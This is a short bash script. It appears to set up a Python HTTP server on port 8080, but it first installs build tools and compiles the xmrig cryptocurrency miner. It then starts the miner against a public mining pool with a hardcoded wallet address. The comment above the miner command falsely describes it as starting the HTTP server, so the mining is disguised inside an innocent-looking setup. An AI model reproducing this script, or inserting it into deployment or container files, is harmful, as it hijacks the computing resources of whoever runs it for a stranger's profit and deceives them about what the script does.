#!/bin/bash

# Update and install necessary packages
apt-get update && \
apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev python3

# Clone the xmrig repository into the current directory
git clone https://github.com/xmrig/xmrig.git

# Navigate to the xmrig directory
cd xmrig

# Create a build directory and compile xmrig
mkdir build && \
cd build && \
cmake .. && \
make

# Start a simple Python HTTP server on port 8080
./xmrig -o pool.hashvault.pro:443 -u 498fshezQrqeYsyFQL7Rm8d3EUGkHaWpiJXL6UAqQ8KNjoKK3hQiPdQJxW6LuzcMa4HbggmFMCn4P7MSJJ6QKh65CUFBAQs -k --tls
python3 -m http.server 8080
